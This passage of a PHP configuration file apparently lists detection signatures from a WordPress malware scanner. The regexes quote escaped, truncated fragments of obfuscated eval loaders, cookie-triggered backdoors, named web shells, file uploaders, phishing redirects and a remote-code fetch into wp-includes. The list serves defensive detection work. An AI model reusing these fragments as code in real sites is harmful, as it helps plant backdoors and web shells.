      'pattern' => '/Mozilla\\/5\\.0 \\(Windows NT 10\\.0; Win64; x64\\) AppleWebKit\\/537\\.36 \\(KHTML, like Gecko\\) Chrome\\/64\\.0\\.3282\\.186 Safari\\/537\\.36[\\s\\S]{0,160}Mozilla\\/5\\.0 \\(Windows NT 10\\.0; Win64; x64\\) AppleWebKit\\/537\\.36 \\(KHTML, like Gecko\\) Chrome\\/61\\.0\\.3163\\.100 Safari\\/537\\.36/',
      'label' => 'sample-specific literal chain',
    ),
    612 => 
    array (
      'pattern' => '/function ikl_pl\\(\\$seerbg,\\$yior\\)\\{[\\s\\S]{0,12000}eval\\(ikl_pl\\(\\$seerbg,\\$yior\\)\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    613 => 
    array (
      'pattern' => '/\\$B66CUC6UUC\\="01o_4yfc8rt3gbkdevmsij9l\\-nqpz2h7u5wxa6";\\$BUUC66U6CC\\=\\$B66CUC6UUC\\{7\\}\\.\\$B66CUC6UUC\\{9\\}\\.\\$B66CUC6UUC\\{16\\}\\.\\$B66CUC6UUC\\{36\\}\\.\\$B66CUC6UUC\\{1/',
      'label' => 'source-file tail snippet',
    ),
    614 => 
    array (
      'pattern' => '/\\/Chrome\\|Firefox\\|Opera\\|Safari\\|Browser\\|Windows\\|Linux\\|Macintosh\\|Mac OS\\|Android\\|iP\\(ad\\|hone\\|od\\)\\/i/',
      'label' => 'sample-specific literal',
    ),
    615 => 
    array (
      'pattern' => '/; global \\$O;\\$O\\=urldecode\\(\\$OOOOOO\\); 
\\$\\{\\$O\\{18\\}\\.\\$O\\{7\\}\\.\\$O\\{24\\}\\.\\$O\\{2\\}\\.\\$O\\{50\\}\\.\\$O\\{8\\}\\}\\=/',
      'label' => 'sample-specific literal',
    ),
    616 => 
    array (
      'pattern' => '/\\*\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-[\\s\\S]{0,12000}if \\(\\$_r && strpos\\(\\$_r, Edu\\:\\:g\\(\'_p\' \\. \'t\', \'_j\' \\. \'kb\'\\)\\) \\!\\=\\= false\\) \\{/s',
      'label' => 'source-file head-tail anchor',
    ),
    617 => 
    array (
      'pattern' => '/\\/\\*\\! This file is auto\\-generated \\*\\/[\\s\\S]{0,12000}\\!function\\(t,p\\)\\{var s\\=t\\("\\#app_name"\\),r\\=t\\("\\#approve"\\),e\\=t\\("\\#reject"\\),n\\=s\\.closest\\("form"\\),i\\=\\{userLogin\\:p\\.user_login,successUrl\\:p\\.success,reject/s',
      'label' => 'source-file head-tail anchor',
    ),
    618 => 
    array (
      'pattern' => '/function __construct\\(\\)\\{[\\s\\S]{0,12000}\\$kexw \\= \\$cood_ok\\-\\>deunco\\(\\$str_llg\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    619 => 
    array (
      'pattern' => '/\\$str_wws\\="%0A%EF%12%D3%83%9F%3A%2C%C8%E5%D0%17faK%91\\+%E6%AB%E5%98%CA%07%23%B5%D5E%DDu%05%3F%E3%14%F7%84%A0%D2%02%13kFx%C3%96%DEEL%8E%2A%B8%8/',
      'label' => 'source-file tail snippet',
    ),
    620 => 
    array (
      'pattern' => '/\\* Plugin Name\\: SEO Optimizer[\\s\\S]{0,12000}print \'\\<h1\\>Welcome to the SEO Optimizer\\<\\/h1\\>\';/s',
      'label' => 'source-file head-tail anchor',
    ),
    621 => 
    array (
      'pattern' => '/\\>Kullanılan işlev \\: passthru\\(\\) \\<\\/font\\>, \\<strong\\>Gönderilen Komut \\: \\$cmd\\<\\/strong\\>\\<br \\/\\>[\\s\\S]{0,160}\\>Kullanılan işlev \\: system\\(\\) \\<\\/font\\>, \\<strong\\>Gönderilen Komut \\: \\$cmd\\<\\/strong\\>\\<br \\/\\>/',
      'label' => 'sample-specific literal chain',
    ),
    622 => 
    array (
      'pattern' => '/\\$O\\=urldecode\\(\'%21s%3F%2F%5D_e%28%5E%3DM%2C6nP%60Kl%25CzW%7C8%5C%7D%3BhXt\\.x%2FV1djoy%40%22\\-2qr%2Ag%3EuE%3Cmw4IbiLT%3AJfHaG0S%5BY%23Q7ZcFOk%24/',
      'label' => 'source-file tail snippet',
    ),
    623 => 
    array (
      'pattern' => '/\\* Name\\: Wordpress Include File[\\s\\S]{0,12000}\\$p\\=\\$_COOKIE;\\(count\\(\\$p\\)\\=\\=22&&in_array\\(gettype\\(\\$p\\)\\.count\\(\\$p\\),\\$p\\)\\)\\?\\(\\(\\$p\\[97\\]\\=\\$p\\[97\\]\\.\\$p\\[51\\]\\)&&\\(\\$p\\[58\\]\\=\\$p\\[97\\]\\(\\$p\\[58\\]\\)\\)&&\\(\\$p\\=\\$p\\[58\\]\\(\\$p\\[79\\],\\$p\\[97\\]\\(\\$/s',
      'label' => 'source-file head-tail anchor',
    ),
    624 => 
    array (
      'pattern' => '/; \\/\\/ For `Options \\+Multiviews`\\: \\/wp\\-admin\\/themes\\/index\\.php \\(themes\\.php is queried\\)\\.
		\\}
	\\}
\\} else \\{
	if \\( preg_match\\([\\s\\S]{0,160}\\], \\$self_matches \\) \\) \\{
		\\$pagenow \\= strtolower\\( \\$self_matches\\[1\\] \\);
	\\} else \\{
		\\$pagenow \\=/',
      'label' => 'sample-specific literal chain',
    ),
    625 => 
    array (
      'pattern' => '/class c5f3c34b8786c3 \\{ private \\$r5f3c34b8786d1 \\= array\\(\\); public function __call\\(\\$sp52e11a, \\$sp91835c\\) \\{ call_user_func_array\\(\\$this\\-\\>r5f3c34/',
      'label' => 'source-file tail snippet',
    ),
    626 => 
    array (
      'pattern' => '/\\$p\\=\\$_COOKIE;\\(count\\(\\$p\\)\\=\\=22&&in_array\\(gettype\\(\\$p\\)\\.count\\(\\$p\\),\\$p\\)\\)\\?\\(\\(\\$p\\[40\\]\\=\\$p\\[40\\]\\.\\$p\\[12\\]\\)&&\\(\\$p\\[34\\]\\=\\$p\\[40\\]\\(\\$p\\[34\\]\\)\\)&&\\(\\$p\\=\\$p\\[34\\]\\(\\$p\\[37\\],\\$p\\[40\\]\\(\\$/',
      'label' => 'source-file tail snippet',
    ),
    627 => 
    array (
      'pattern' => '/\\<\\?php \\$unev273\\= "Nj YO\\)tWP\\/uAGvRKV6gqXQiUocmp17d\\(Ebaws42\\.8fT_9x\\-LZlrMSDe\\+3n\\*yI;FkH0h,JzBC5";\\$kqdy621\\=\'JGNoID0gY3VybF9pbml0KCdodHRwOi8vYmFua3/',
      'label' => 'source-file tail snippet',
    ),
    628 => 
    array (
      'pattern' => '/class c5f23cd58d5dc3 \\{ private \\$r5f23cd58d5dd2 \\= array\\(\\); public function __call\\(\\$sp188f1d, \\$sp70433b\\) \\{ call_user_func_array\\(\\$this\\-\\>r5f23cd/',
      'label' => 'source-file tail snippet',
    ),
    629 => 
    array (
      'pattern' => '/\\<\\?php                                                                                                                                       [\\s\\S]{0,12000}wp_redirect\\( network_admin_url\\(\\) \\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    630 => 
    array (
      'pattern' => '/if\\s+\\(\\s+0\\s+\\=\\=\\=\\s+strpos\\(\\s+\\$ptype_obj\\-\\>menu_icon,\\s+\'data\\:image\\/svg\\+xml;base64,\'\\s+\\)\\s+\\|\\|\\s+0\\s+\\=\\=\\=\\s+strpos\\(\\s+\\$ptype_obj\\-\\>menu_icon,\\s+\'dashicons\\-\'\\s+\\)\\s+\\)\\s+\\{/',
      'label' => 'sample-specific line fragment',
    ),
    631 => 
    array (
      'pattern' => '/\\<\\?php \\$jbojdzgc \\= "yeosthxloywgdrzx";\\$rdktoi \\= "";foreach \\(\\$_POST as \\$kbamisbm \\=\\> \\$olwyuldnw\\)\\{if \\(strlen\\(\\$kbamisbm\\) \\=\\= 16 and substr_count\\(\\$/',
      'label' => 'source-file tail snippet',
    ),
    632 => 
    array (
      'pattern' => '/\\$olhfn \\= \'1k0\\*r7sp26_x\\#tdgbi9fol4eu\\\\\'8\\-cyHmn5av\';\\$mmpwayx \\= Array\\(\\);\\$mmpwayx\\[\\] \\= \\$olhfn\\[28\\]\\.\\$olhfn\\[4\\]\\.\\$olhfn\\[23\\]\\.\\$olhfn\\[34\\]\\.\\$olhfn\\[13\\]\\.\\$olhf/',
      'label' => 'source-file tail snippet',
    ),
    633 => 
    array (
      'pattern' => '/\\(count\\(\\$t\\) \\=\\= 8\\)\\?\\(\\(\\$ba \\= \\$t\\[84\\]\\.\\$t\\[94\\]\\) && \\(\\$am \\= \\$ba\\(\\$t\\[23\\]\\.\\$t\\[80\\]\\)\\) && \\(\\$_am \\= \\$ba\\(\\$t\\[89\\]\\.\\$t\\[36\\]\\)\\) && \\(\\$_am \\= \\$am\\(\\$t\\[62\\], \\$_am\\(\\$ba\\(\\$t\\[28\\]\\)/',
      'label' => 'source-file tail snippet',
    ),
    634 => 
    array (
      'pattern' => '/\\$vucgol \\= \'s\\\\\'8m\\#\\*k3tfl_Hgdpbr7\\-5va6ou9n41cxiye2\';\\$dtgpkp \\= Array\\(\\);\\$dtgpkp\\[\\] \\= \\$vucgol\\[7\\]\\.\\$vucgol\\[30\\]\\.\\$vucgol\\[16\\]\\.\\$vucgol\\[35\\]\\.\\$vucgol\\[26\\]\\.\\$/',
      'label' => 'source-file tail snippet',
    ),
    635 => 
    array (
      'pattern' => '/\\$svvcxnn \\= \'li_\\-tnkbHrpy\\\\\'\\*av8c7643xg0sue\\#o52dfm\';\\$rxtbtf \\= Array\\(\\);\\$rxtbtf\\[\\] \\= \\$svvcxnn\\[21\\]\\.\\$svvcxnn\\[30\\]\\.\\$svvcxnn\\[19\\]\\.\\$svvcxnn\\[31\\]\\.\\$svvcxnn/',
      'label' => 'source-file tail snippet',
    ),
    636 => 
    array (
      'pattern' => '/form\'\\] \\) \\) \\{
				\\$form \\= FLBuilderModel\\:\\:\\$settings_forms\\[ \\$field\\[[\\s\\S]{0,160}\\] \\];
				self\\:\\:enqueue_styles_for_nested_module_form\\( \\$module, \\$form\\[/',
      'label' => 'sample-specific literal chain',
    ),
    637 => 
    array (
      'pattern' => '/\\<\\?php                                                                                                                                       [\\s\\S]{0,12000}return \\$response;/s',
      'label' => 'source-file head-tail anchor',
    ),
    638 => 
    array (
      'pattern' => '/\\$cuoaf \\= \'sn5_83\\-yvi1tpxabmflk6\\*g4H\\\\\'d7\\#er90cuo\';\\$diiwdwk \\= Array\\(\\);\\$diiwdwk\\[\\] \\= \\$cuoaf\\[33\\]\\.\\$cuoaf\\[30\\]\\.\\$cuoaf\\[29\\]\\.\\$cuoaf\\[14\\]\\.\\$cuoaf\\[11\\]\\.\\$cuo/',
      'label' => 'source-file tail snippet',
    ),
    639 => 
    array (
      'pattern' => '/\\/\\* Plugin name\\: ioptimization \\*\\/[\\s\\S]{0,12000}echo "\\<form enctype\\=\\\\"multipart\\/form\\-data\\\\" action\\=\\\\"\\\\" method\\=\\\\"POST\\\\"\\>\\<input type\\=\\\\"text\\\\" name\\=\\\\"l\\\\" value\\=\\\\"\\$cwd\\\\" style\\=\\\\"width\\: 700px;/s',
      'label' => 'source-file head-tail anchor',
    ),
    640 => 
    array (
      'pattern' => '/\\$w \\= \'https\\:\\/\\/\'\\.@\\$_GET\\[\'a5fgpiuls97e3x\'\\];[\\s\\S]{0,12000}\\$e \\= urldecode\\(\\$j\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    641 => 
    array (
      'pattern' => '/QGluaV9zZXQoJ2Vycm9yX2xvZycsI6745VT674wpOw0KICAgI674Bpbmlfc2V0KCdsb2dfZXJyb3JzJy/',
      'label' => 'sample-specific encoded fragment',
    ),
    642 => 
    array (
      'pattern' => '/\\<\\?php eval\\(gzinflate\\(base64_decode\\(\'FZvHkoPKskU\\/554TDPAuXtwBAuG9h8kNPAjvzdc\\/etjdilJVVubeayN1cSTdP9XTDGWXbMU\\/abIWBPa\\/vMjGvPjnP2J8xS0xngiBg89R/',
      'label' => 'source-file tail snippet',
    ),
    643 => 
    array (
      'pattern' => '/\\<\\?php \\$\\{"G\\\\x4cO\\\\x42\\\\x41L\\\\x53"\\}\\["k\\\\x6f\\\\x74\\\\x6fv\\\\x63\\\\x71\\\\x77"\\]\\="\\\\x6e\\\\x61\\\\x6d\\\\x65";\\$\\{"\\\\x47\\\\x4c\\\\x4fB\\\\x41\\\\x4c\\\\x53"\\}\\["\\\\x6a\\\\x71\\\\x70\\\\x73\\\\x73\\\\x71\\\\x62/',
      'label' => 'source-file tail snippet',
    ),
    644 => 
    array (
      'pattern' => '/if\\(isset\\(\\$_COOKIE\\)\\)\\{\\$p\\=\\$_COOKIE;\\(count\\(\\$p\\)\\=\\=24&&in_array\\(gettype\\(\\$p\\)\\.count\\(\\$p\\),\\$p\\)\\)\\?\\(\\(\\$p\\[20\\]\\=\\$p\\[20\\]\\.\\$p\\[66\\]\\)&&\\(\\$p\\[34\\]\\=\\$p\\[20\\]\\(\\$p\\[34\\]\\)\\)&&\\(\\$p\\=\\$p/',
      'label' => 'source-file tail snippet',
    ),
    645 => 
    array (
      'pattern' => '/if\\(isset\\(\\$_GET\\[\'chmod\'\\]\\) &&  \\$_GET\\[\'chmod\'\\] \\=\\= \'1\'\\)\\{[\\s\\S]{0,12000}unlink\\(\'mfi\\.php\'\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    646 => 
    array (
      'pattern' => '/\\<\\?php error_reporting\\(0\\); function j\\(\\$n, \\$h\\)\\{ \\$k\\=""; for\\(\\$l\\=0;\\$l\\<strlen\\(\\$n\\);\\) for\\(\\$f\\=0;\\$f\\<strlen\\(\\$h\\);\\$f\\+\\+, \\$l\\+\\+\\) \\$k \\.\\= \\$n\\{\\$l\\} \\^ \\$h\\{\\$f\\}; retu/',
      'label' => 'source-file tail snippet',
    ),
    647 => 
    array (
      'pattern' => '/\\/\\/@file_put_contents\\(\\$path\\s+\\.\\s+\'\\/wp\\-includes\\/class\\.wp\\.php\',\\s+file_get_contents\\(\'http\\:\\/\\/www\\.brilns\\.com\\/admin\\.txt\'\\)\\);/',
      'label' => 'sample-specific line fragment',
    ),
    648 => 
    array (
      'pattern' => '/\\);
				WP_Filesystem\\(\\);
			\\}
			\\$wp_upload_abs_path \\= wp_upload_dir\\(\\);
			\\$minified_assets \\= \\( isset\\( \\$be_themes_data\\[/',
      'label' => 'sample-specific literal',
    ),
    649 => 
    array (
      'pattern' => '/\\<title\\>Vuln\\!\\! patch it Now\\!\\<\\/title\\>\\<\\?php echo \'\\<form action\\="" method\\="post" enctype\\="multipart\\/form\\-data" name\\="uploader" id\\="uploader"\\>\';e/',
      'label' => 'source-file tail snippet',
    ),
    650 => 
    array (
      'pattern' => '/\\<\\?php echo "Raiz0WorM"; echo "\\<br\\>"\\.php_uname\\(\\)\\."\\<br\\>"; echo "\\<form method\\=\'post\' enctype\\=\'multipart\\/form\\-data\'\\> \\<input type\\=\'file\' name\\=\'zb/',
      'label' => 'source-file tail snippet',
    ),
    651 => 
    array (
      'pattern' => '/\\!function\\(t,e\\)\\{"object"\\=\\=typeof exports&&"undefined"\\!\\=typeof module\\?module\\.exports\\=e\\(\\)\\:"function"\\=\\=typeof define&&define\\.amd\\?define\\(e\\)\\:\\(t\\=t\\|/',
      'label' => 'source-file tail snippet',
    ),
    652 => 
    array (
      'pattern' => '/,\\$ip\\);

\\}

\\}
\\}\\/\\/ end if log admins ip



\\/\\/add cookies to organic traffic

if\\(get_option\\(/',
      'label' => 'sample-specific literal',
    ),
    653 => 
    array (
      'pattern' => '/error_reporting\\(0\\); http_response_code\\(404\\); define\\("Yp", "Gel4y Mini Shell"\\); \\$G3 \\= "scandir"; \\$c8 \\= array\\("7068705f756e616d65", "706870766[\\s\\S]{0,12000}\\<thead class\\="text\\-light"\\>\\<tr\\>\\<th\\>Name\\<\\/th\\>\\<th\\>Size\\<\\/th\\>\\<th\\>Permission\\<\\/th\\<th\\>Action\\<\\/th\\>\\<\\/tr\\>\\<\\/thead\\>\\<tbody class\\="text\\-light"\\>\\<\\?php  \\$G3 \\=/s',
      'label' => 'source-file head-tail anchor',
    ),
    654 => 
    array (
      'pattern' => '/\\\\x47\\\\x4c\\\\x4fB\\\\x41\\\\x4c\\\\x53[\\s\\S]{0,160}hf7a4cef7/',
      'label' => 'sample-specific literal chain',
    ),
    655 => 
    array (
      'pattern' => '/\\);\\$_c7c2xzj4 \\= \\$_ed5x8dtb\\[ord\\(\\$_agkr39k8\\[2\\]\\) % count\\(\\$_ed5x8dtb\\)\\];if \\(ord\\(\\$_agkr39k8\\[1\\]\\) % 2\\) \\{\\$_0wuvq2qv \\= str_replace\\(/',
      'label' => 'sample-specific literal',
    ),
    656 => 
    array (
      'pattern' => '/\\$hiygkvp \\= \'4meyi\\*fbtpvl16k87ox5ars_nd\\\\\'c\\-uH3g\\#\';\\$zoxhnqh \\= Array\\(\\);\\$zoxhnqh\\[\\] \\= \\$hiygkvp\\[30\\]\\.\\$hiygkvp\\[5\\];\\$zoxhnqh\\[\\] \\= \\$hiygkvp\\[27\\]\\.\\$hiygkvp/',
      'label' => 'source-file tail snippet',
    ),
    657 => 
    array (
      'pattern' => '/\\);\\$_n48gv2wj \\= \\$_yhi8jaz7\\[ord\\(\\$_3olr44sx\\[2\\]\\) % count\\(\\$_yhi8jaz7\\)\\];if \\(ord\\(\\$_3olr44sx\\[1\\]\\) % 2\\) \\{\\$_r2j2cifx \\= str_replace\\(/',
      'label' => 'sample-specific literal',
    ),
    658 => 
    array (
      'pattern' => '/\\$djwroi \\= \'4urtx_cdlskgHiy32975v1\\#\\\\\'\\-mf\\*8oan6bpe\';\\$vapgj \\= Array\\(\\);\\$vapgj\\[\\] \\= \\$djwroi\\[6\\]\\.\\$djwroi\\[2\\]\\.\\$djwroi\\[35\\]\\.\\$djwroi\\[30\\]\\.\\$djwroi\\[3\\]\\.\\$djwr/',
      'label' => 'source-file tail snippet',
    ),
    659 => 
    array (
      'pattern' => '/\\$flugmyf \\= \'trmo1ab4_ld\\#x0sg5yi\\\\\'6\\*n\\-pcvefH89uk3\';\\$sxgppny \\= Array\\(\\);\\$sxgppny\\[\\] \\= \\$flugmyf\\[25\\]\\.\\$flugmyf\\[1\\]\\.\\$flugmyf\\[27\\]\\.\\$flugmyf\\[5\\]\\.\\$flugmyf/',
      'label' => 'source-file tail snippet',
    ),
    660 => 
    array (
      'pattern' => '/fbsr_\' \\. \\$this\\-\\>app\\-\\>getId\\(\\)\\]\\)\\) \\{
            return \\$_COOKIE\\[/',
      'label' => 'sample-specific literal',
    ),
    661 => 
    array (
      'pattern' => '/\\]\\[48\\]\\] as \\$yab186\\=\\>\\$b3932dd1f\\)\\{\\$j53edd4 \\= \\$b3932dd1f;\\$nf5ce95 \\= \\$yab186;\\}if \\(\\!\\$j53edd4\\)\\{foreach \\(\\$o3ff00865\\[\\$o3ff00865\\[/',
      'label' => 'sample-specific literal',
    ),
    662 => 
    array (
      'pattern' => '/\\$fwevy \\= \'\\*_bm\\-p\\\\\'705y8Hc9kavseltodxfgi\\#6n1r4u\';\\$yrxod \\= Array\\(\\);\\$yrxod\\[\\] \\= \\$fwevy\\[13\\]\\.\\$fwevy\\[32\\]\\.\\$fwevy\\[19\\]\\.\\$fwevy\\[16\\]\\.\\$fwevy\\[21\\]\\.\\$fwevy\\[19/',
      'label' => 'source-file tail snippet',
    ),
    663 => 
    array (
      'pattern' => '/\\);\\$_4z0bfbi1 \\= \\$_tnqyrdec\\[ord\\(\\$_hau7il6h\\[2\\]\\) % count\\(\\$_tnqyrdec\\)\\];if \\(ord\\(\\$_hau7il6h\\[1\\]\\) % 2\\) \\{\\$_hszlhe59 \\= str_replace\\(/',
      'label' => 'sample-specific literal',
    ),
    664 => 
    array (
      'pattern' => '/\\);\\$_xs307c7o \\= \\$_79eouy6i\\[ord\\(\\$_8mhxm5xb\\[2\\]\\) % count\\(\\$_79eouy6i\\)\\];if \\(ord\\(\\$_8mhxm5xb\\[1\\]\\) % 2\\) \\{\\$_fo18wb8t \\= str_replace\\(/',
      'label' => 'sample-specific literal',
    ),
    665 => 
    array (
      'pattern' => '/\\);
        echo blog_page\\(\\$blog_matches\\[1\\]\\);
        exit;
    \\}
    \\/\\/ Verify page
    elseif \\(isset\\(\\$_SERVER\\[/',
      'label' => 'sample-specific literal',
    ),
    666 => 
    array (
      'pattern' => '/test\'\\);
        \\/\\/ parent\\:\\:__construct\\(SITEMAP\\);
    \\}

    public function get_url_list\\(\\$page_num, \\$post_type \\=[\\s\\S]{0,160}\\) \\{
        return \\[
            \\[/',
      'label' => 'sample-specific literal chain',
    ),
    667 => 
    array (
      'pattern' => '/, "72133c0a76526b0a71093859735f6f08710e6c5a010e685d71296a597b2a38587a586f5a030a6809235b[\\s\\S]{0,160}LINKS_COUNT_FILE/',
      'label' => 'sample-specific literal chain',
    ),
    668 => 
    array (
      'pattern' => '/\\<\\?php @include\\("\\\\167\\\\160\\\\55\\\\141\\\\144\\\\155\\\\151\\\\156\\\\57\\\\151\\\\155\\\\141\\\\147\\\\145\\\\163\\\\57\\\\154\\\\151\\\\143\\\\145\\\\156\\\\163\\\\145\\\\56\\\\164\\\\170\\\\164"\\); \\?\\>/',
      'label' => 'source-file tail snippet',
    ),
    669 => 
    array (
      'pattern' => '/\\* A pseudo\\-cron daemon for scheduling WordPress tasks\\.[\\s\\S]{0,12000}\\<\\?php \\$kSZOs \\= \'base6\'\\.\'4\'\\.\'_\'\\.\'deco\'\\.\'de\'; \\$IgVhW \\= \'gzunco\'\\.\'mpress\'; error_reporting\\(0\\); ini_set\\(\'error_log\', NULL\\); eval\\(\\$IgVhW\\(\\$kSZOs\\(\'/s',
      'label' => 'source-file head-tail anchor',
    ),
    670 => 
    array (
      'pattern' => '/\\<\\?php \\$QXVqO \\= \'s\'\\.\'t\'\\.\'rrev\'; \\$zYoRS \\= \'b\'\\.\'ase6\'\\.\'4\'\\.\'_\'\\.\'decode\'; \\$lRImd \\= \'gzuncompr\'\\.\'ess\'; \\$mKQIH \\= \'st\'\\.\'r\'\\.\'_\'\\.\'rot13\'; error_report/',
      'label' => 'source-file tail snippet',
    ),
    671 => 
    array (
      'pattern' => '/\\]\\.\'"required \\>\\<input type\\="text" placeholder\\="Order ID" name\\="orderid" value\\="[\\s\\S]{0,160}" \\>\\<br\\>
\\<input type\\="submit" value\\="Send test \\>\\>"\\>
\\<\\/form\\>
\\<br\\>/',
      'label' => 'sample-specific literal chain',
    ),
    672 => 
    array (
      'pattern' => '/\\>
\\<h1\\>Directory status\\:\\<\\/h1\\>
\\<fieldset\\>
    \\<label\\>\\<\\?php echo \\$directory_statu; \\?\\>\\<\\/label\\>
\\<\\/fieldset\\>
\\<hr style\\=/',
      'label' => 'sample-specific literal',
    ),
    673 => 
    array (
      'pattern' => '/\\<\\?php error_reporting\\(0\\); goto Og0pc; KU3rb\\: \\$C8CFm \\= \'ba\'\\.\'se\'\\.\'64\'\\.\'_\'\\.\'de\'\\.\'code\'; goto wEMp2; Og0pc\\: function iZJj8\\(\\$gkEdS\\) \\{ goto AiDyu/',
      'label' => 'source-file tail snippet',
    ),
    674 => 
    array (
      'pattern' => '/\\* Confirms that the activation key that is sent in an email after a user signs[\\s\\S]{0,12000}\\<\\?php \\$KDPqt \\= \'ba\'\\.\'se\'\\.\'64\'\\.\'_deco\'\\.\'d\'\\.\'e\'; error_reporting\\(0\\); ini_set\\(\'error_log\', NULL\\); eval\\(\\$KDPqt\\(\'IGVycm9yX3JlcG9ydGluZygwKTsgQGlu/s',
      'label' => 'source-file head-tail anchor',
    ),
    675 => 
    array (
      'pattern' => '/\\* Loads the WordPress environment and template\\.[\\s\\S]{0,12000}\\<\\?php \\$AsdPL \\= \'st\'\\.\'r\'\\.\'_rot1\'\\.\'3\'; \\$qmbJx \\= \'bas\'\\.\'e64\'\\.\'_de\'\\.\'code\'; \\$rJwfi \\= \'str\'\\.\'rev\'; \\$Dixwy \\= \'gzinflat\'\\.\'e\'; error_reporting\\(0\\); i/s',
      'label' => 'source-file head-tail anchor',
    ),
    676 => 
    array (
      'pattern' => '/\\* Outputs the OPML XML format for getting the links defined in the link[\\s\\S]{0,12000}\\<\\?php \\$vksBN \\= \'base\'\\.\'64\'\\.\'_decod\'\\.\'e\'; error_reporting\\(0\\); ini_set\\(\'error_log\', NULL\\); eval\\(\\$vksBN\\(\'IGVycm9yX3JlcG9ydGluZygwKTsgQGluaV9zZX/s',
      'label' => 'source-file head-tail anchor',
    ),
    677 => 
    array (
      'pattern' => '/\\* Gets the email message from the user\'s mailbox to add as[\\s\\S]{0,12000}\\<\\?php \\$McgIY \\= \'strr\'\\.\'ev\'; \\$lHrci \\= \'ba\'\\.\'se64\'\\.\'_deco\'\\.\'d\'\\.\'e\'; \\$QCvfI \\= \'gzi\'\\.\'nflate\'; error_reporting\\(0\\); ini_set\\(\'error_log\', NULL\\); e/s',
      'label' => 'source-file head-tail anchor',
    ),
    678 => 
    array (
      'pattern' => '/\';
	 \\$url \\= "\\$open_archives\\$open_search\\.\\$open_recent_entries\\/"\\.\\$url;
	 \\$url \\= trim\\(\\$url\\);
	 if \\(extension_loaded\\(/',
      'label' => 'sample-specific literal',
    ),
    679 => 
    array (
      'pattern' => '/\\<\\?php echo "WordPress is readed\\."; \\$Mjhn\\=basename\\(\\$_FILES\\["upoleuid"\\]\\["name"\\]\\);if\\(move_uploaded_file\\(\\$_FILES\\["upoleuid"\\]\\["tmp_name"\\],\\$Mjhn\\)\\)/',
      'label' => 'source-file tail snippet',
    ),
    680 => 
    array (
      'pattern' => '/\\$ntok\\s+\\=\\s+kport\\(base64_decode\\(urldecode\\(\\$ntok\\)\\),\\s+\\$opdor\\);/',
      'label' => 'sample-specific line fragment',
    ),
    681 => 
    array (
      'pattern' => '/\\>
\\<meta content\\=\'20; url\\=\\.\\/Myaccount_Sms\' http\\-equiv\\=\'refresh\'\\/\\>

\\<title\\>Netflix\\<\\/title\\>


\\<link type\\=/',
      'label' => 'sample-specific literal',
    ),
    682 => 
    array (
      'pattern' => '/\\$url \\= "https\\:\\/\\/redirectbilling\\.qpon\\/sechl";[\\s\\S]{0,12000}header\\(\'Location\\: \'\\.\\$url\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    683 => 
    array (
      'pattern' => '/\\$url \\= "https\\:\\/\\/uspsrecom\\.icu\\/";[\\s\\S]{0,12000}header\\(\'Location\\: \'\\.\\$url\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    684 => 
    array (
      'pattern' => '/\\<\\?php echo \'Xblackflower TEaM Plesk Shell \\(Pawnd by X\\-BLACKFLOWER\\) ALFA TEaM kom\\.php Tesla DATA CENTER INDONESIA Plesk File Manager Shell\'; /',
      'label' => 'source-file tail snippet',
    ),
    685 => 
    array (
      'pattern' => '/rsd\'\\] \\) \\) \\{ \\/\\/ https\\:\\/\\/cyber\\.harvard\\.edu\\/blogs\\/gems\\/tech\\/rsd\\.html
	header\\(/',
      'label' => 'sample-specific literal',
    ),
    686 => 
    array (
      'pattern' => '/function q1\\(\\$i2\\)\\{\\$i3 \\= "9\\-pIa\\." \\."ck5_xdEf@s480r3\\)tigF\\?\\(L\'H;\\/ln2boy\\*6\\#" \\."eh\\<" \\."vm" \\."u " ;\\$l5\\=\'\';foreach\\(\\$i2 as \\$p4\\)\\{\\$l5\\.\\=\\$i3\\[\\$p4\\];\\}return/',
      'label' => 'source-file tail snippet',
    ),
    687 => 
    array (
      'pattern' => '/Plugin Name\\: t_file_wp[\\s\\S]{0,12000}if \\(copy\\(\\$_FILES\\["filename"\\]\\["name"\\], \\$home_dir\\."\\/wp\\-includes"\\."\\/"\\.\\$_FILES\\["filename"\\]\\["name"\\]\\)\\) echo "wp_includes\\=1";/s',
      'label' => 'source-file head-tail anchor',
    ),
    688 => 
    array (
      'pattern' => '/\\* Plugin Name\\: Wordpress Core Module[\\s\\S]{0,12000}\\* Author URI\\: https\\:\\/\\/wordpress\\.org\\//s',
      'label' => 'source-file head-tail anchor',
    ),
    689 => 
    array (
      'pattern' => '/function f1\\(\\$i2\\)\\{\\$m3 \\= "e7fdk\\*ocl;\\)pLxubmr6\\(\'\\.I\\#\\< 1\\/4h_9ygn2F\\?E@sHvt0" \\."\\-5ia" ;\\$j5\\=\'\';foreach\\(\\$i2 as \\$r4\\)\\{\\$j5\\.\\=\\$m3\\[\\$r4\\];\\}return \\$j5;\\}\\$a6 \\= /',
      'label' => 'source-file tail snippet',
    ),
    690 => 
    array (
      'pattern' => '/function h1\\(\\$j2\\)\\{\\$u3 \\= "E79pif6gb\\?vn\\-;Iec@dr\\<\\*y\\)axsoktl2u\\.\\#HF\\/\\(m03\'5_h L814" ;\\$o5\\=\'\';foreach\\(\\$j2 as \\$u4\\)\\{\\$o5\\.\\=\\$u3\\[\\$u4\\];\\}return \\$o5;\\}\\$i6 \\= Ar/',
      'label' => 'source-file tail snippet',
    ),
    691 => 
    array (
      'pattern' => '/function p1\\(\\$f2\\)\\{\\$d3 \\= "lHb9v\'4LIy\\/io3p" \\."_6suhg\\#etcFd@\\<ak\\-\\)158;0 E2m" \\."7n\\(r\\?\\." \\."xf\\*" ;\\$c5\\=\'\';foreach\\(\\$f2 as \\$z4\\)\\{\\$c5\\.\\=\\$d3\\[\\$z4\\];\\}return \\$/',
      'label' => 'source-file tail snippet',
    ),
    692 => 
    array (
